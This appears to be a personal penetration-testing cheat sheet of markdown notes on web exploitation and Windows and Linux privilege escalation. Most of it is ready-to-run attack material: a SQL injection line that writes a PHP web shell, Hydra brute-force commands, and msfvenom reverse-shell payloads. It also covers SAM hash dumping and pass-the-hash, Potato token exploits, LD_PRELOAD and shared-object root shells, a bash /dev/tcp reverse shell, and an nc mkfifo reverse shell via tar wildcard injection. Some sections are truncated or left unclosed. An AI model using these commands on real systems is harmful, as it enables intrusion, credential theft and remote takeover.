```
curl -v -X OPTIONS http://website/directory
#HTTP options such as PUT, Delete are bad
```

# Exploitation
## Exploitation Web application
### General
When modifying web exploits, there are several key questions we generally need to ask while approaching the code:
-	Does it initiate an HTTP or HTTPS connection?
-	Does it access a web application specific path or route?
-	Does the exploit leverage a pre-authentication vulnerability?
-	If not, how does the exploit authenticate to the web application?
-	How are the GET or POST requests crafted to trigger and exploit the vulnerability?
-	Does it rely on default application settings (such as the web path of the application) that may have been changed after installation?
-	Will oddities such as self-signed certificates disrupt the exploit?

### SQL Injection
- Use ‘ and “ to look for possible errors
- use # and -- for comments after the injection.
- If returning multiple rows gives errors use ```LIMIT 1``` in the query
- use ```ORDER BY``` to find the amount of columns. Increment it by 1 till no output is shown.
- use ```load_file('C:/Windows/System32/drivers/etc/hosts')``` to load files instead of database data.
- use ```"<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '<PATH TO WEBROOT>/backdoor.php'``` to create a simple php backdoor.

#### MYSQL Commands
```
show grants;
show variables;
show databases;
use <DATABASE>;
show tables;
describe <TABLE>;
SELECT * FROM <TABLE>;
```

### File upload
#### File upload intruder extensions list
```

## FTP
- Check if login is allowed as anonymous:anonymous.

## Password Attacks
https://github.com/danielmiessler/SecLists
#### Hydra bruteforce FTP
```
hydra -L <USERNAMEFILE> -P <PASSWORDFILE> -t 24 ftp://<IP>:<PORT>
```

#### Hydra bruteforce SSH
```
hydra -L <USERNAMEFILE> -P <PASSWORDFILE> -t 24 ssh://<IP>:<PORT>
```

#### Hydra bruteforce HTTP login
Login using Burp or check in developers tools to check the request for the required information! You need to get the username/password/login parameter and the error message!

https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/
```
hydra -L <USERNAMEFILE> -P <PASSWORDFILE> <IP> http-post-form "<LOGINPAGE>:<COOKIES FROM BURP AND SET ^USER^ AND ^PASS^>:<ERROR MESSAGE FAILED LOGIN>"

## SMB and NETBIOS
NetBIOS is an independent session layer protocol and service that allows computers on a local network to communicate with each other. While modern implementations of SMB can work without NetBIOS, NetBIOS over TCP (NBT)211 is required for backward compatibility and is often enabled together.

#### NBTSCAN
```
sudo nbtscan -r <IP RANGE>
```

#### Nmap SMB Script
```
/usr/share/nmap/scripts/smb*
```

## NFS Shares
Portmapper and RPCBind run on TCP port 111

#### Enumerations
```
rpcinfo irked.htb
nmap -sSUC -p111 <IP>
```

#### Mount shares
```
sudo mount -o nolock <IP>:/<SHARE> <MOUNT LOCATION>
sudo mount -t cifs -o port=<PORT> //<IP>/<SHARE> -o username=<USERNAME>,password=<PASSWORD> /mnt/<FOLDER>
```

#### Open file with no permission to file
If a file found which we want to access but don’t have permissions. Make a user with the same username and change the UUID, change to the user so we can access the file.
```
sudo adduser pwn
sudo vim /etc/passwd
```

# Local privilege escalation
Exploit binaries
- Linux https://gtfobins.github.io/
- Windows https://lolbas-project.github.io/

Static binaries
- https://github.com/andrew-d/static-binaries

# Windows
## General tips
- Windows check if Windows Scheduler is running (```tasklist```)
  - Go to C:\Program files (x65)\SystemScheduler\Events and check the logs to see if anything is running every x minutes.
  - Check if we got write permissions
- Administrative command execution tips
  - Use msfvenom for shells if we can execute something with admin privileges
     - ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe```
     - ```msfvenom -p windows/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe```
  - RDP
     - ```net localgroup administrators <username> /add```

#### accesschk.exe
AccessChk is an old but still trustworthy tool for checking user access control rights. You can use it to check whether a user or group has access to files, directories, services, and registry keys. The downside is more recent versions of the program spawn a GUI “accept EULA” popup window. When using the command line, we have to use an older version which still has an /accepteula command line option.

#### Check for drivers
```
driverquery /v
```

#### Check the driver files for version etc and check if it’s vulnerable
```
cd C:\Program Files\<DRIVER>
```

## Privilege escalation techniques windows
Run winPEAS and if it find something fuzzy use these techniques to exploit it.

## Kernel exploits
Kernels are the core of any operating system. Think of it as a layer between application software and the actual computer hardware. The kernel has complete control over the operating system. Exploiting a kernel vulnerability can result in execution as the SYSTEM user.

1. Enumerate Windows version / patch level (systeminfo)
2. Find matching exploits (Google, ExploitDB, Github)
3. Compile and run

#### Finding kernal exploits
- https://github.com/bitsadmin/wesng
- https://github.com/rasta-mouse/Watson
- Pre compiled Kernal exploits
  - https://github.com/SecWiki/windows-kernel-exploits
  
#### Get systeminfo
```
systeminfo > systeminfo.txt
```

### Run on kali
```
python wes.py systeminfo.txt -i 'Elevation of privilege' --exploits-only
```

#### Cross-reference results with compiled exploits + run them
https://github.com/SecWiki/windows-kernel-exploits

## Service Exploits
Services are simply programs that run in the background, accepting input or performing regular tasks. If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to command execution with SYSTEM privileges as well.

#### Query the configuration of a service:
```
sc.exe qc <SERVICE NAME>
```

#### Query the current status of a service:
```
sc.exe query <SERVICE NAME>
```

#### Modify a configuration option of a service:
```
sc.exe config >NAME> <OPTION>= <VALUE>
```

#### Start/Stop a service:
```
net start/stop <SERVICE NAME>
```

### Service Exploits - Insecure Service Properties
Each service has an ACL which defines certain service-specific permissions. Some permissions are innocuous (e.g. SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS). Some may be useful (e.g. SERVICE_STOP, SERVICE_START). Some are dangerous (e.g. SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS).

If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own. Potential Rabbit Hole: If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!

#### Confirm with accesschk.exe
```
.\accesschk.exe /accepteula -uwcqv <USER> <SERVICE NAME>
```

#### Check the current configuration of the service:
```
sc qc daclsvc
```

#### Check current status of the service
```
sc query daclsvc
```

#### Reconfigure the service to use our reverse shell executable:
```
sc config daclsvc binpath= "\"C:\temp\reverse.exe\""
```

#### Start a listener on Kali, and then start the service to trigger the exploit:
```
net start daclsvc
```

### Unqouted Service Path
Executables in Windows can be run without using their extension (e.g. “whoami.exe” can be run by just typing “whoami”). Some executables take arguments, separated by spaces, e.g. someprog.exe arg1 arg2 arg3… This behavior leads to ambiguity when using absolute paths that are unquoted and contain spaces.

Consider the following unquoted path: ```C:\Program Files\Some Dir\SomeProgram.exe``` To us, this obviously runs ```SomeProgram.exe```. To Windows, ```C:\Program``` could be the executable, with two arguments: ```Files\Some``` and ```Dir\ SomeProgram.exe``` Windows resolves this ambiguity by checking each of the possibilities in turn. If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead.

#### Confirm this using sc:
```
sc qc <SERVICE NAME>
```

#### Use accesschk.exe to check for write permissions:
```
.\accesschk.exe /accepteula -uwdq "<PATH WITH SPACE>"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

#### Copy the reverse shell executable and rename it appropriately:
```
copy C:\temp\reverse.exe "<PATH>"
```

#### Start a listener on Kali, and then start the service to trigger the exploit:
```
net stop <SERVICE>
net start <SERVICE>
```

### Weak registry permissions
The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the service directly.

#### We can confirm a weak registery entry with:
a. Powershell
   - ```Get-Acl <REG PATH> | Format-List```
B. accesschk.exe
   - ```.\accesschk.exe /accepteula -uvwqk <REG PATH>```

#### Overwrite the <VALUE> of registry key to point to our reverse shell executable:
```
reg add <REG PATH> /v <REG VALUE> /t REG_EXPAND_SZ /d C:\temp\reverse.exe /f
```

#### Start a listener on Kali, and then start the service to trigger the exploit:
```
net stop <SERVICE>
net start <SERVICE>
```

### Insecure Service Executables
If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable. Remember to create a backup of the original executable if you are exploiting this in a real system!

#### Check if executable is writable
```
.\accesschk.exe /accepteula -quvw "<PATH TO EXE>"
```

#### Create a backup of the original service executable:
```
copy "<PATH>" C:\Temp
```

#### Copy the reverse shell executable to overwrite the service executable:
```
copy /Y C:\PrivEsc\reverse.exe "<PATH>"
```

#### Start a listener on Kali, and then start the service to trigger the exploit:
```
net stop <SERVICE>
net start <SERVICE>
```

### DLL Hijacking
Often a service will try to load functionality from a library called a DLL (dynamic-link library). Whatever functionality the DLL provides, will be executed with the same privileges as the service that loaded it. If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.

A more common misconfiguration that can be used to escalate privileges is if a DLL is missing from the system, and our user has write access to a directory within the PATH that Windows searches for DLLs in. Unfortunately, initial detection of vulnerable services is difficult, and often the entire process is very manual 

#### Check for a writable directory that is in path
Start by enumerating which of these services our user has stop and start access to:
```
.\accesschk.exe /accepteula -uvqc <USER> <SERVICE>
```

#### Confirm output of winpeas if DLL is vulnerable
```
sc qc <SERVICE>
```

1. Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the Filter menu.
2. Add a new filter on the Process Name matching NAME.exe.
3. On the main screen, deselect registry activity and network activity.
4. Start the service:
5. Back in Procmon, note that a number of “NAME NOT FOUND” errors appear, associated with the .dll file.
6. At some point, Windows tries to find the file in the C:\Temp directory, which as we found earlier, is writable by our user.

#### On Kali, generate a reverse shell DLL named hijackme.dll:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o <NAME>.dll
msfvenom -p windows/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o <NAME>.dll
```

#### Copy the DLL to the Windows VM and into the C:\Temp directory. Start a listener on Kali and then stop/start the service to trigger the exploit:
```
net stop <SERVICE>
net start <SERVICE>
```

## Registery
### Autoruns
Windows can be configured to run commands at startup, with elevated privileges. These “AutoRuns” are configured in the Registry. If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges.

#### Enumerate autorun executables
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

#### Check executables manually
```
.\accesschk.exe /accepteula -wvu "<PATH TO EXE>"
```

#### If an autorun executable is found, make a copy
```
copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
```

#### Copy reverse shell to overwrite the autorun executable:
```
copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
```

#### Start a listener on Kali, and then restart the Windows VM to trigger the exploit.
Note that on Windows 10, the exploit appears to run with the privileges of the last logged on user, so log out of the “user” account and log in as the “admin” account first.

### AlwaysInstallElevated
MSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell.

The catch is that two Registry settings must be enabled for this to work. The “AlwaysInstallElevated” value must be set to 1 for both the local machine: HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer and the current user: HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer If either of these are missing or disabled, the exploit will not work.

#### Manually check
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Mi
```

#### Create a reverse shell with msfvenom
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o reverse.msi
msfvenom -p windows/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o reverse.msi
```

#### Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:
```
msiexec /quiet /qn /i C:\temp\reverse.msi
```

## Passwords
Yes, passwords. Even administrators re-use their passwords, or leave their passwords on systems in readable locations. Windows can be especially vulnerable to this, as several features of Windows store passwords insecurely.

### Registery
Plenty of programs store configuration options in the Windows Registry. Windows itself sometimes will store passwords in plaintext in the Registry. It is always worth searching the Registry for passwords. The following commands will search the registry for keys and values that contain “password”

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### Spawn shell using credentials
```
winexe -U '<USERNAME>%<PASSWORD>' //<IP> cmd.exe
```

### Saved creds
Windows has a runas command which allows users to run commands with the privileges of other users. This usually requires the knowledge of the other user’s password. However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement.

#### Manually check for saved credentials
```
cmdkey /list
```

#### Use saved credentials
```
runas /savecred /user:admin C:\temp\reverse.exe
```

### Configuration Files
```
Some administrators will leave configurations files on the system with passwords in them. The Unattend.xml file is an example of this. It allows for the largely automated setup of Windows systems.
```

#### Manually search
```
dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt
```

### SAM
Windows stores password hashes in the Security Account Manager (SAM). The hashes are encrypted with a key which can be found in a file named SYSTEM. If you have the ability to read the SAM and SYSTEM files, you can extract the hashes. Located in: ```C:\Windows\System32\config directory.``` or ```C:\Windows\Repair``` or  ```C:\Windows\System32\config\RegBack directories```

#### Copy them to kali
```
copy C:\Windows\Repair\SAM \\<IP>\<SHARE>\
copy C:\Windows\Repair\SYSTEM \\<IP>\<SHARE>\
```

#### Run creddump pdump.py
- https://github.com/Neohapsis/creddump7.git
- /usr/share/creddump7/pwdump.py

```
python2 creddump7/pwdump.py SYSTEM SAM
```

#### Crack with hashcat
```
hashcat -a 0 -m 1000 --force <HASHES> <WORDLIST>
```

#### Pass the hash login
```
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //<IP> cmd.exe
pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //<IP> cmd.exe
```

## Scheduled tasks
Windows can be configured to run tasks at specific times, periodically (e.g. every 5 mins) or when triggered by some event (e.g. a user logon). Tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM.

#### List all scheduled tasks
```
schtasks /query /fo LIST /v
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

## Insecure GUI Apps
On some (older) versions of Windows, users could be granted the permission to run certain GUI apps with administrator privileges. There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality. Since the parent process is running with administrator privileges, the spawned command prompt will also run with these privileges. I call this the “Citrix Method” because it uses many of the same techniques used to break out of Citrix environments.

#### If you cna open a file with this app go to the explorer and fill in
```
file://c:/windows/system32/cmd.exe
```

## Startup apps
Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory. Windows also has a startup directory for apps that should start for all users: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.

Note that shortcut files (.lnk) must be used. The following VBScript can be used to create a shortcut file.

#### Use accesschk.exe to check permissions on the StartUp directory:
```
.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

#### Create a file CreateShortcut.vbs with the VBScript provided. Change file paths if necessary.
```
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

#### Run the script using cscript
```
cscript CreateShortcut.vbs
```

#### Start listener if admin logs == shell

## Installed applications
Most privilege escalations relating to installed applications are based on misconfigurations we have already covered. Still, some privilege escalations results from things like buffer overflows, so knowing how to identify installed applications and known vulnerabilities is still important.

#### Manually enumerate all running programs:
```
tasklist /v
```

#### Use seatbelt or winPEAS to enumerate nonstandard processes
```
.\seatbelt.exe NonstandardProcesses
.\winPEASany.exe quiet procesinfo
```

## Hot potato
Hot Potato is the name of an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges. The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution. This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts.

1. Copy the potato.exe exploit executable over to Windows.
2. Start a listener on Kali.
3. Run the exploit: ```.\potato.exe -ip <IP> -cmd "C:\temp\reverse.exe" - enable_httpserver true -enable_defender true -enable_spoof true - enable_exhaust true```
4. Wait for a Windows Defender update, or trigger one manually.

## Token impersonation
### Service accounts
We briefly talked about service accounts at the start of the course. Service accounts can be given special privileges in order for them to run their services, and cannot be logged into directly. Unfortunately, multiple problems have been found with service accounts, making them easier to escalate privileges with.

### Rotten potato
The original Rotten Potato exploit was identified in 2016. Service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user. This was possible because service accounts usually have the “SeImpersonatePrivilege” privilege enabled.

#### SeImpersonate / SeAssignPrimaryToken
Service accounts are generally configured with these two privileges. They allow the account to impersonate the access tokens of other users (including the SYSTEM user). Any user with these privileges can run the token impersonation exploits in this lecture.

### Juicy potato
- https://github.com/ohpe/juicy-potato
Rotten Potato was quite a limited exploit. Juicy Potato works in the same way as Rotten Potato, but the authors did extensive research and found many more ways to exploit.

#### Run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges:
If the CLSID ({03ca…) doesn’t work for you, either check this list: https://github.com/ohpe/juicy-potato/blob
```
C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\temp\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

### Rogue potato
- https://github.com/antonioCoco/RoguePotato
- https://github.com/antonioCoco/RoguePotato/releases

#### use PSExec64.exe to trigger a reverse shell running as the Local Service service account:
```
C:\temp\PSExec64.exe /accepteula -i -u "nt authority\local service" C:\temp\reverse.exe
```

#### Now run the RoguePotato exploit to trigger a reverse shell running with SYSTEM privileges 
```
C:\PrivEsc\RoguePotato.exe -r <IP> –l <PORT> -e "C:\temp\reverse.exe"
```

### Printspoofer
PrintSpoofer is an exploit that targets the Print Spooler service.
- https://github.com/itm4n/PrintSpoofer

#### Run printspoofer exploit
```
C:\PrivEsc\PrintSpoofer.exe –i -c "C:\temp\reverse.exe"
```

### User privileges
- https://github.com/hatRiot/token-priv
In Windows, user accounts and groups can be assigned specific “privileges”. These privileges grant access to certain abilities. Some of these abilities can be used to escalate our overall privileges to that of SYSTEM.

#### Check privileges
Note that “disabled” in the state column is irrelevant here. If the privilege is listed, your user has it.
```
whoami /priv
```

- SeImpersonatePrivilege
  - The SeImpersonatePrivilege grants the ability to impersonate any access tokens which it can obtain. If an access token from a SYSTEM process can be obtained, then a new process can be spawned using that token. The Juicy Potato exploit in a previous section abuses this ability.
- SeAssignPrimaryPrivilege
  - The SeAssignPrimaryPrivilege is similar to SeImpersonatePrivilege. It enables a user to assign an access token to a new process. Again, this can be exploited with the Juicy Potato exploit.
- SeBackupPrivilege
  -  The SeBackupPrivilege grants read access to all objects on the system, regardless of their ACL. Using this privilege, a user could gain access to sensitive files, or extract hashes from the registry which could then be cracked or used in a pass-the-hash attack.
- seRestorePrivilege
  - The SeRestorePrivilege grants write access to all objects on the system, regardless of their ACL. There are a multitude of ways to abuse this privilege: Modify service binaries, Overwrite DLLS used by SYSTEM processes, Modify registery settings
- SeTakeOwnershipPrivilege
  - The SeTakeOwnershipPrivilege lets the user take ownership over an object (the WRITE_OWNER permission). Once you own an object, you can modify its ACL and grant yourself write access. The same methods used with SeRestorePrivilege then apply.

## Linux
## General tips
#### Easy ways to get root
#### 1. Cat a new root user entry to /etc/passwd
```
openssl passwd <PASS> #generate password
echo "root2:<OPENSSL OUTPUT>:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2 #sudo to root with the password set
```

#### 2. Copy /bin/bash and set suid bit
```
cp /bin/bash /tmp/rootbash sh; chmod +s /temp/rootbash
/tmp/rootbash -p
```

#### 3. If a process executes another process which we control.
   - Compile the following C code
   ```
   int main() {
   setuid(0);
   system("/bin/bash -p");
   }
   ```
   - gcc -o <NAME> <FILENAME.C>

#### 4. MSFVenom shell
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

## Privilege escalation techniques linux
### Kernel exploits
Kernels are the core of any operating system. Think of it as a layer between application software and the actual computer hardware. The kernel has complete control over the operating system. Exploiting a kernel vulnerability can result in execution as the root user. Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.

1. Enumerate kernel versions ```(uname -a)```
2. Find matching exploits
3. Compile and run

## Service exploits
Services are simply programs that run in the background, accepting input or performing regular tasks. If vulnerable services are running as root, exploiting them can lead to command execution as root. Service exploits can be found using Searchsploit, Google, and GitHub, just like with Kernel exploits.

#### Find services running as root
```
ps aux | grep "^root""
````

#### Find version of software
```
<PROGRAM> --version
<PROGRAM> -v
dpkg -l | grep <PROGRAM>
rpm –qa | grep <PROGRAM>
```

## Weak file permissions
Certain system files can be taken advantage of to perform privilege escalation if the permissions on them are too weak. If a system file has confidential information we can read, it may be used to gain access to the root account. If a system file can be written to, we may be able to modify the way the operating system works and gain root access that way.

#### Find al writable files in /etc
```
find /etc -maxdepth 1 -writable -type f
```
- if /etc/shadow is readable. Change the hash!
- if /etc/passwd is writeable. (Write a new entry, See begin linux privesc)

#### Find al readable files in /etc
```
find /etc -maxdepth 1 -readable -type f
```
- if /etc/shadow is readable. Crack the hashes! ```mkpasswd -m sha-512 newpassword```

#### Find al directories which can be written to:
```
find / -executable -writable -type d 2> /dev/null
```

#### Look for backup files
```
ls /tmp
ls /var/backups
ls /
```

## Sudo
sudo is a program which lets users run other programs with the security privileges of other users. By default, that other user will be root. A user generally needs to enter their password to use sudo, and they must be permitted access via rule(s) in the /etc/sudoers file. Rules can be used to limit users to certain programs, and forgo the password entry requirement.

#### Check programs a user can run as sudo
```
sudo -l
```

#### Run a program using sudo
```
sudo <PROGRAM>
```

#### Run a program as a specific user
```
sudo -u <USERNAME> <PROGRAM>
```

#### If a program is found check gtfobins
- https://gtfobins.github.io/

### Apache2 trick
apache2 doesn’t have any known shell escape sequences, however when parsing a given config file, it will error and print any line it doesn’t understand.
```
sudo apache2 -f /etc/shadow
#use hashcat to crack the hashes
```

### Environment variables
Programs run through sudo can inherit the environment variables from the user’s environment. In the /etc/sudoers config file, if the env_reset option is set, sudo will run programs in a new, minimal environment. The env_keep option can be used to keep certain environment variables from the user’s environment. The configured options are displayed when running sudo -l

### LD_preload
LD_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file. When set, the shared object will be loaded before any others. By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded. LD_PRELOAD will not work if the real user ID is different from the effective user ID. sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option.

#### Create a file (preload.c)
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

#### Compile it
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

#### Run any allowed program while setting the LD_Preload environment variable
```
sudo LD_PRELOAD=/tmp/preload.so <PROGRAM
```

### LD_LIBRARY_PATH
The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first. The ldd command can be used to print the shared libraries used by a program: ```ldd /usr/sbin/apache2``` By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead.

#### Run ldd against program file
```
ldd /usr/sbin/apache2\
```

#### Create a file (library_path.c) with the following contents:
```
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

#### Compile library_path.c into libcrypt.so.1:
```
gcc -o libcrypt.so.1 -shared -fPIC library_path.c
```

#### Run apache2 using sudo, while setting the LD_LIBRARY_PATH environment variable to the current path (where we compiled library_path.c):
```
sudo LD_LIBRARY_PATH=. apache2
```

## Cronjobs
Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron jobs run with the security level of the user who owns them. By default, cron jobs are run using the /bin/sh shell, with limited environment variables. Cron table files (crontabs) store the configuration for cron jobs. User crontabs are usually located in ```/var/spool/cron/``` or ```/var/spool/cron/crontabs/``` The system-wide crontab is located at ```/etc/crontab```.

#### Overwritable files
- Different ways to exploit
  - bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
  - see beginnen of linux privesc for more ways
  
### Path environment variable
The crontab PATH environment variable is by default set to ```/usr/bin:/bin``` The PATH variable can be overwritten in the crontab file. If a cron job program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job.

#### Get content of the system wide contrab:
```
cat /etc/crontab
```

#### Create the file <SCRIPTNAME> in the writable directory with the following contents
```
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```
  
#### Ensure it executable
```
chmod +x /home/user/overwrite.sh
```

#### Run /tmp/rootbash
```
/tmp/rootbash -p
```

### Wildcards
When a wildcard character (\*) is provided to a command as part of an argument, the shell will first perform filename expansion (also known as globbing) on the wildcard. This process replaces the wildcard with a space-separated list of the file and directory names in the current directory. An easy way to see this in action is to run the following command from your home directory: ```echo *```

Exploiting wildcard for privilege escalation (For example tar * in this directory) https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

#### Example2
```
echo "mkfifo /tmp/lhennp; nc <IP> <PORT> 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

#### Example1
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf
chmod +x shell.elf
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
nc -nvlp <PORT>
```

### SUID / SGID
- SUID files get executed with the privileges of the file owner.
- SGID files get executed with the privileges of the file group.
If the file is owned by root, it gets executed with root privileges, and we may be able to use it to escalate privileges.

#### Find SUID and SGID
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

### Shell escape sequences
Just as we were able to use shell escape sequences with programs running via sudo, we can do the same with SUID / SGID files. A list of programs with their shell escape sequences can be found here: https://gtfobins.github.io/ Refer to the previous section on shell escape sequences for how to use them.

### Shared object injection 
When a program is executed, it will try to load the shared objects it requires. By using a program called strace, we can track these system calls and determine whether any shared objects were not found. If we can write to the location the program tries to open, we can create a shared object and spawn a root shell when it is loaded.

#### run strace on the SUID File:
```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```
The <NAME> shared object could not be found, and the program is looking in <DIRECTORY>, which we can write to.
  
#### Creat the directory + file with the contents
```
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
setuid(0);
system("/bin/bash -p");
}
```

#### Compile FILE in the directory
```
gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
```

#### Run SUID Executable

### PATH environment variable
The PATH environment variable contains a list of directories where the shell should try to find programs. If a program tries to execute another program, but only specifies the program name, rather than its full (absolute) path, the shell will search the PATH directories until it is found. Since a user has full control over their PATH variable, we can tell the shell to first look for programs in a directory we can write to.

If a program tries to execute another program, the name of that program is likely embedded in the executable file as a string. We can run strings on the executable file to find strings of characters. We can also use strace to see how the program is executing. Another program called ltrace may also be of use.

```
strings <PATH TO FILE>
strace -v -f -e execve <COMMAND> 2>&1 | grep exec
ltrace <COMMAND>
```

### Abusing shell features #1
In some shells (notably Bash <4.2-048) it is possible to define user functions with an absolute path name. These functions can be exported so that subprocesses have access to them, and the functions can take precedence over the actual executable being called.

#### Run strings on the SUID File
```
strings /usr/local/bin/suid-env2
```

#### Verify the version of Bash is lower than 4.2-048:
```
bash --version
```

#### Create a Bash function with the name “PROGRAM IT RUNS” and export the function:
```
function <PROGRAM> { /bin/bash -p; }
export –f <PROGRAM>
```

#### Execute the SUID file

### Abusing shell features #2
Bash has a debugging mode which can be enabled with the –x command line option, or by modifying the SHELLOPTS environment variable to include xtrace. By default, SHELLOPTS is read only, however the env command allows SHELLOPTS to be set. When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debug statements. This variable can include an embedded command, which will execute every time it is shown.

If a SUID file runs another program via Bash (e.g. by using system() ) these environment variables can be inherited. If an SUID file is being executed, this command will execute with the privileges of the file owner. In Bash versions 4.4 and above, the PS4 environment variable is not inherited by shells running as root.

#### Run strings on the SUID File
```
strings /usr/local/bin/suid-env2
```

#### Run the SUID file with bash debugging enabled and the PS4 variable assigned to our payload:
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
```

#### Run the /tmp/rootbash file
```
/tmp/rootbash -p
```

## Passwords & Keys
While it might seem like a long shot, weak password storage and password re-use can be easy ways to escalate privileges. While the root user’s account password is hashed and stored securely in /etc/shadow, other passwords, such as those for services may be stored in plaintext in config files. If the root user re-used their password for a service, that password may be found and used to switch to the root user.

### History files
History files record commands issued by users while they are using certain programs. If a user types a password as part of a command, this password may get stored in a history file. It is always a good idea to try switching to the root user with a discovered password.

```
cat -/.*history
```

### Config files
Many services and programs use configuration (config) files to store settings. If a service needs to authenticate to something, it might store the credentials in a config file. If these config files are accessible, and the passwords they store are reused by privileged users, we may be able to use it to log in as that user.

- auth.txt in /etc/openvpn
- webconfigs
- sqlconfigs

### SSH keys
SSH keys can be used instead of passwords to authenticate users using SSH. SSH keys come in pairs: one private key, and one public key. The private key should always be kept secret. If a user has stored their private key insecurely, anyone who can read the key may be able to log into their account using it.

```
ls -l /.ssh
```

### NFS
NFS (Network File System) is a popular distributed file system. NFS shares are configured in the /etc/exports file. Remote users can mount shares, access, create, modify files. By default, created files inherit the remote user’s id and group id (as owner and group respectively), even if they don’t exist on the NFS server.

#### Show the NFS server's export list:
```
showmount -e <TARGET>
```

#### Mount an NFS Share
```
